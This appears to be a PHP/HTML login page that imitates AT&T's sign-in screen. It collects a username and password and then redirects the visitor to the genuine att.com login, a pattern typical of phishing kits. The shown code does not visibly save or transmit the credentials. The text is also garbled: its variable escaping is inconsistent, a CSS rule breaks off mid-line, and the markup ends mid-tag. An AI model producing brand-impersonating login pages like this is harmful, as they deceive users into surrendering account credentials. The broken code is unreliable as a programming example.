<?php
session_start();

// Initialize variables
\$error_message = '';
\$username = '';
\$password = '';

// Check if the form has been submitted
if (\$_SERVER["REQUEST_METHOD"] == "POST") {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Basic validation
    if (empty($username) || empty($password)) {
        \$error_message = "Please enter your username and password.";
    } else {
        // Redirect to AT&T login
        header("Location: https://www.att.com/login/");
        exit();
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In to AT&T</title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: #ffffff;
            width: 400px;
            padding: 40px;
            border: 1px solid #d1d1d1;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            border-radius: 4px;
        }

        .logo-text {
            font-size: 
        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 8px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 2px;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #0066cc;
            outline: none;
        }

        .btn-primary {
            width: 100%;
            padding: 12px;
            background-color: #0066cc;
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-primary:hover {
            background-color: #0052a3;
        }

        .links {
            margin-top: 20px;
            text-align: center;
            font-size: 13px;
        }

        .links a {
            color: #0066cc;
            text-decoration: none;
            margin: 0 10px;
        }

        .links a:hover {
            text-decoration: underline;
        }

        .error-msg {
            color: #d32f2f;
            background-color: #fce8e6;
            padding: 10px;
            border: 1px solid #d32f2f;
            margin-bottom: 20px;
            font-size: 14px;
            text-align: center;
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .checkbox-group input {
            margin-right: 8px;
        }

        .checkbox-group label {
            margin-bottom: 0;
            font-weight: normal;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo-text">AT&T</div>
        
        <?php if (\$error_message): ?>
            <div class="error-msg
